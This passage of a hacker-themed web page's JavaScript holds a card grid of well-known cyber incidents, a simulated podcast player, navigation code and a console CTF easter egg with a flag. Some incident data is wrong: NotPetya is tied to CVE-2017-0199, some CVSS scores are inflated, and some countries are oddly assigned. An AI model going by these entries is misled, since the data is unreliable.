        impact: 'Destroyed approximately 1,000 Iranian nuclear centrifuges. Changed the landscape of cyber warfare forever.'
    },
    {
        country: 'Ukraine',
        flag: '🇺🇦',
        vulnCount: 'CVE-2017-0199',
        year: '2017',
        name: 'NotPetya Vector',
        severity: 'Critical',
        cvss: '9.3',
        affected: 'M.E.Doc (Ukrainian tax software)',
        description: 'Supply chain attack through Ukrainian tax software M.E.Doc. Used as the initial vector for the NotPetya destructive malware.',
        impact: 'Caused over $10 billion in damages worldwide. Crippled Maersk, Merck, FedEx, and Ukrainian government systems.'
    },
    {
        country: 'North Korea',
        flag: '🇰🇵',
        vulnCount: 'Multiple CVEs',
        year: '2014',
        name: 'Sony Pictures Hack',
        severity: 'High',
        cvss: '8.5',
        affected: 'Sony Pictures Entertainment',
        description: 'Massive data breach attributed to Lazarus Group. Included employee data, unreleased films, and executive emails.',
        impact: 'Leaked 100TB of data. Led to CEO resignation. First major state-sponsored destructive attack on a corporation.'
    },
    {
        country: 'Israel',
        flag: '🇮🇱',
        vulnCount: 'CVE-2021-30860',
        year: '2021',
        name: 'FORCEDENTRY',
        severity: 'Critical',
        cvss: '9.8',
        affected: 'Apple iOS (iMessage)',
        description: 'Zero-click exploit in Apple iMessage used by NSO Group Pegasus spyware. Required no user interaction to compromise target devices.',
        impact: 'Used to surveil journalists, activists, and politicians. Led to NSO Group being blacklisted by the US.'
    },
    {
        country: 'India',
        flag: '🇮🇳',
        vulnCount: 'CVE-2019-0708',
        year: '2019',
        name: 'BlueKeep',
        severity: 'Critical',
        cvss: '9.8',
        affected: 'Windows Remote Desktop Services',
        description: 'Wormable RCE vulnerability in RDP. Pre-authentication, no user interaction needed. Could spread like WannaCry.',
        impact: 'Over 950,000 systems exposed at time of disclosure. Major concern for healthcare and industrial systems in India.'
    },
    {
        country: 'Brazil',
        flag: '🇧🇷',
        vulnCount: 'CVE-2014-0160',
        year: '2014',
        name: 'Heartbleed',
        severity: 'Critical',
        cvss: '9.4',
        affected: 'OpenSSL 1.0.1',
        description: 'Buffer over-read in OpenSSL allowing attackers to read server memory. Could leak private keys, passwords, and session tokens.',
        impact: 'Affected 17% of all SSL web servers. Required mass certificate revocation and reissue globally.'
    },
    {
        country: 'Germany',
        flag: '🇩🇪',
        vulnCount: 'CVE-2020-1472',
        year: '2020',
        name: 'Zerologon',
        severity: 'Critical',
        cvss: '10.0',
        affected: 'Windows Netlogon (MS-NRPC)',
        description: 'Cryptographic flaw in Netlogon protocol allowing any attacker on the network to instantly become Domain Admin.',
        impact: 'Complete Active Directory compromise in seconds. Widely exploited by APT groups and ransomware operators.'
    }
];

function initVulnMap() {
    const mapGrid = document.getElementById('mapGrid');
    
    vulnerabilities.forEach((vuln, index) => {
        const card = document.createElement('div');
        card.className = 'country-card';
        card.style.animationDelay = `${index * 0.1}s`;
        card.onclick = () => openVulnModal(index);
        
        card.innerHTML = `
            <div class="country-flag">${vuln.flag}</div>
            <div class="country-name">${vuln.country}</div>
            <div class="country-vuln-count">${vuln.vulnCount}</div>
            <div class="country-year">${vuln.name} // ${vuln.year}</div>
        `;
        
        mapGrid.appendChild(card);
    });
}

function openVulnModal(index) {
    const vuln = vulnerabilities[index];
    const modal = document.getElementById('vulnModal');
    const modalTitle = document.getElementById('modalTitle');
    const modalBody = document.getElementById('modalBody');
    
    const severityClass = vuln.severity === 'Critical' ? 'severity-critical' : 'severity-high';
    
    modalTitle.innerHTML = `${vuln.flag} ${vuln.name}`;
    modalBody.innerHTML = `
        <div class="vuln-info-row">
            <span class="vuln-info-label">CVE ID:</span>
            <span class="vuln-info-value" style="color: var(--red-blood);">${vuln.vulnCount}</span>
        </div>
        <div class="vuln-info-row">
            <span class="vuln-info-label">Country:</span>
            <span class="vuln-info-value">${vuln.country}</span>
        </div>
        <div class="vuln-info-row">
            <span class="vuln-info-label">Year:</span>
            <span class="vuln-info-value">${vuln.year}</span>
        </div>
        <div class="vuln-info-row">
            <span class="vuln-info-label">Severity:</span>
            <span class="vuln-severity ${severityClass}">${vuln.severity} (CVSS: ${vuln.cvss})</span>
        </div>
        <div class="vuln-info-row">
            <span class="vuln-info-label">Affected:</span>
            <span class="vuln-info-value">${vuln.affected}</span>
        </div>
        
        <div class="vuln-description">
            <strong style="color: var(--amber);">Description:</strong><br>
            ${vuln.description}
            <br><br>
            <strong style="color: var(--red-blood);">Impact:</strong><br>
            ${vuln.impact}
        </div>
    `;
    
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closeVulnModal() {
    document.getElementById('vulnModal').classList.remove('active');
    document.body.style.overflow = 'auto';
}

// Close modal on backdrop click
document.getElementById('vulnModal').addEventListener('click', function(e) {
    if (e.target === this) closeVulnModal();
});

// ==========================================
// COPY CODE FUNCTION
// ==========================================
function copyCode(btn, codeId) {
    const codeEl = document.getElementById(codeId);
    const text = codeEl.innerText.replace(/^\s*\d+\s*/gm, ''); // Remove line numbers
    
    navigator.clipboard.writeText(text).then(() => {
        btn.classList.add('copied');
        btn.innerHTML = '✓ Copied!';
        
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.innerHTML = '📋 Copy';
        }, 2000);
    });
}

// ==========================================
// PODCAST WAVEFORM & PLAYER
// ==========================================
const podcastStates = [
    { playing: false, progress: 0, duration: 45 * 60 + 22 },
    { playing: false, progress: 0, duration: 38 * 60 + 15 },
    { playing: false, progress: 0, duration: 52 * 60 + 8 }
];

function initWaveforms() {
    for (let i = 0; i < 3; i++) {
        const waveform = document.getElementById(`waveform${i}`);
        if (!waveform) continue;
        for (let j = 0; j < 40; j++) {
            const bar = document.createElement('div');
            bar.className = 'wave-bar';
            const height = Math.random() * 20 + 5;
            bar.style.height = height + 'px';
            bar.style.setProperty('--wave-height', height + 'px');
            bar.style.animationDelay = (Math.random() * 0.5) + 's';
            waveform.appendChild(bar);
        }
    }
}

function togglePlay(index) {
    const btn = document.getElementById(`playBtn${index}`);
    const waveform = document.getElementById(`waveform${index}`);
    const state = podcastStates[index];
    
    // Stop all other players
    podcastStates.forEach((s, i) => {
        if (i !== index && s.playing) {
            s.playing = false;
            document.getElementById(`playBtn${i}`).textContent = '▶';
            document.getElementById(`playBtn${i}`).classList.remove('playing');
            document.getElementById(`waveform${i}`).querySelectorAll('.wave-bar').forEach(b => b.classList.remove('active'));
        }
    });
    
    state.playing = !state.playing;
    
    if (state.playing) {
        btn.textContent = '⏸';
        btn.classList.add('playing');
        waveform.querySelectorAll('.wave-bar').forEach(b => b.classList.add('active'));
        simulateProgress(index);
    } else {
        btn.textContent = '▶';
        btn.classList.remove('playing');
        waveform.querySelectorAll('.wave-bar').forEach(b => b.classList.remove('active'));
    }
}

function simulateProgress(index) {
    const state = podcastStates[index];
    if (!state.playing) return;
    
    state.progress += 1;
    if (state.progress >= state.duration) {
        state.progress = 0;
        state.playing = false;
        document.getElementById(`playBtn${index}`).textContent = '▶';
        document.getElementById(`playBtn${index}`).classList.remove('playing');
        return;
    }
    
    const percent = (state.progress / state.duration) * 100;
    document.getElementById(`progressFill${index}`).style.width = percent + '%';
    
    const mins = Math.floor(state.progress / 60);
    const secs = Math.floor(state.progress % 60);
    document.getElementById(`currentTime${index}`).textContent = 
        `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    
    // Animate wave bars randomly
    const bars = document.getElementById(`waveform${index}`).querySelectorAll('.wave-bar');
    bars.forEach(bar => {
        bar.style.height = (Math.random() * 25 + 3) + 'px';
    });
    
    setTimeout(() => simulateProgress(index), 1000);
}

function seekBack(index) {
    podcastStates[index].progress = Math.max(0, podcastStates[index].progress - 15);
}

function seekForward(index) {
    podcastStates[index].progress = Math.min(
        podcastStates[index].duration, 
        podcastStates[index].progress + 15
    );
}

function seekTo(event, index) {
    const rect = event.currentTarget.getBoundingClientRect();
    const x = event.clientX - rect.left;
    const percent = x / rect.width;
    podcastStates[index].progress = Math.floor(percent * podcastStates[index].duration);
}

// ==========================================
// NAVIGATION
// ==========================================
function initNavScroll() {
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    });
    
    // Mobile menu
    const mobileBtn = document.getElementById('mobileMenuBtn');
    const navLinks = document.getElementById('navLinks');
    
    if (mobileBtn) {
        mobileBtn.addEventListener('click', () => {
            navLinks.classList.toggle('mobile-open');
        });
    }
}

function initSmoothScroll() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                
                // Update active nav link
                document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
                this.classList.add('active');
                
                // Close mobile menu
                document.getElementById('navLinks').classList.remove('mobile-open');
            }
        });
    });
}

// ==========================================
// HIDDEN PAGE / CTF CHALLENGE
// ==========================================
function logSecretMessage() {
    console.log('%c╔══════════════════════════════════════╗', 'color: #00ff41; font-size: 14px;');
    console.log('%c║  🔍 You found the console!           ║', 'color: #00ff41; font-size: 14px;');
    console.log('%c║  Hidden path: /s3cr3t_r00m_7734      ║', 'color: #dc143c; font-size: 14px;');
    console.log('%c║  Or call: revealHiddenPage()          ║', 'color: #ffb000; font-size: 14px;');
    console.log('%c╚══════════════════════════════════════╝', 'color: #00ff41; font-size: 14px;');
    console.log('%cBase64 hint: RkxBR3tZMHVfRjB1bmRfVGgzX1MzY3IzdF9SMDBtfQ==', 'color: #666; font-size: 11px;');
}

// This function can be called from console
window.revealHiddenPage = function() {
    document.getElementById('hidden-page').classList.add('revealed');
    document.body.style.overflow = 'hidden';
    console.log('%c🎉 FLAG{Y0u_F0und_Th3_S3cr3t_R00m}', 'color: #00ff41; font-size: 20px; font-weight: bold;');
};

function closeHiddenPage() {
    document.getElementById('hidden-page').classList.remove('revealed');
    document.body.style.overflow = 'auto';
}

// Also listen for the secret path in URL hash
window.addEventListener('hashchange', () => {
    if (window.location.hash === '#/s3cr3t_r00m_7734') {
        revealHiddenPage();
    }
});

if (window.location.hash === '#/s3cr3t_r00m_7734') {
    setTimeout(revealHiddenPage, 1000);
}

// ==========================================
// TYPING EFFECT
// ==========================================
function typeEffect(element, text, speed = 50) {
    let i = 0;
    element.textContent = '';
    element.classList.add('type-effect');
    
    function type() {
        if (i < text.length) {
            element.textContent += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else {
            element.classList.remove('type-effect');
        }
    }
    type();
}

// ==========================================
// INTERSECTION OBSERVER FOR ANIMATIONS
// ==========================================
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const appearObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.animation = 'fadeInUp 0.6s ease forwards';
            appearObserver.unobserve(entry.target);
        }
    });
}, observerOptions);

// Observe elements when main content loads
setTimeout(() => {
    document.querySelectorAll('.code-editor, .podcast-card, .country-card, .ctf-banner').forEach(el => {
        el.style.opacity = '0';
        appearObserver.observe(el);
    });
}, 100);

// ==========================================
// KEYBOARD SHORTCUT: Konami-ish code to reveal hidden page
// ==========================================
let secretCode = [];
const targetCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];

document.addEventListener('keydown', (e) => {
    secretCode.push(e.key);
    if (secretCode.length > targetCode.length) {
        secretCode.shift();
    }
    if (JSON.stringify(secretCode) === JSON.stringify(targetCode)) {
        revealHiddenPage();
        secretCode = [];
    }
});

// Close modal on Escape
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeVulnModal();
        closeHiddenPage();
    }
});
</script>

</body>
</html>
